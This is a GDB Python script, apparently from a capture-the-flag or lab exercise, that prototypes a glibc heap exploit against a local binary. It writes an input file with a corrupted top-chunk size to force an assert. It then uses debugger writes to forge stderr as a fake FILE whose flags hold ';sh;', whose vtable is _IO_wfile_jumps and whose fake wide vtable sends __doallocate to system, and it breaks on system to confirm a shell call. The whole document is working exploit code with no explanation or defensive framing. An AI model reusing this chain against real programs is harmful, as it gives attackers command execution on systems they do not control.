import gdb, struct
p64 = lambda x: struct.pack("<Q", x)

OPS = [
    (0x10, b"\x00"*8),
    (0x10, p64(0) + p64(0) + p64(0xd21)),   # bad top size -> assert on next big malloc
    (0x1000, b"\x00"*8),
]

def build(ops):
    out = b""
    for size, payload in ops:
        out += struct.pack("<Q", size) + payload + b"\n"
    return out

open("./_z_441/input.bin", "wb").write(build(OPS))

def wq(addr, val):
    gdb.execute("set *(unsigned long*)%#x = %#x" % (addr, val & 0xffffffffffffffff))

class GetsBP(gdb.Breakpoint):
    def stop(self):
        hits[0] += 1
        rdi = int(gdb.parse_and_eval("$rdi"))
        pkt = rdi - 8
        gdb.write("\n=== GETS#%d pkt=%#x ===\n" % (hits[0], pkt))
        if hits[0] == 2:
            heap = pkt - 0x2c0
            stderr = int(gdb.parse_and_eval("(unsigned long)&_IO_2_1_stderr_"))
            libc = int(gdb.parse_and_eval("(unsigned long)&_IO_2_1_stderr_")) - 0x21a6a0
            gdb.write("heap=%#x stderr=%#x libc=%#x\n" % (heap, stderr, libc))
            fake_wide = heap + 0x600
            fake_wvt  = heap + 0x760
            # zero the scratch areas
            for off in range(0, 0x900, 8):
                wq(heap + off, 0)
            # fake stderr FILE
            wq(stderr + 0x00, 0x733b06d0)      # flags + ";sh;" string tail
            wq(stderr + 0x88, heap + 0x700)    # _lock -> zero dword
            wq(stderr + 0x98, heap + 0x800)    # _codecvt -> zeros
            wq(stderr + 0xa0, fake_wide)       # _wide_data
            wq(stderr + 0xc0, 0)               # _mode
            wq(stderr + 0xd8, libc + 0x2160c0) # vtable = _IO_wfile_jumps
            # fake wide_data: all zero, _wide_vtable at +0xe0
            wq(fake_wide + 0xe0, fake_wvt)
            wq(fake_wvt + 0x68, libc + 0x50d60)  # __doallocate = system
            gdb.write("patched stderr; vtable=%#x wide=%#x\n" % (libc + 0x2160c0, fake_wide))
        return hits[0] >= len(OPS)

hits = [0]
GetsBP("gets")
gdb.execute("break system")
try:
    gdb.execute("run < ./_z_441/input.bin")
except gdb.error as e:
    gdb.write("run ended: %s\n" % e)
gdb.write("\npc=%#x\n" % int(gdb.parse_and_eval("$pc")))
try:
    gdb.write(gdb.execute("x/s $rdi", to_string=True))
except Exception as e:
    gdb.write("rdi err %s\n" % e)
gdb.write(gdb.execute("bt", to_string=True))
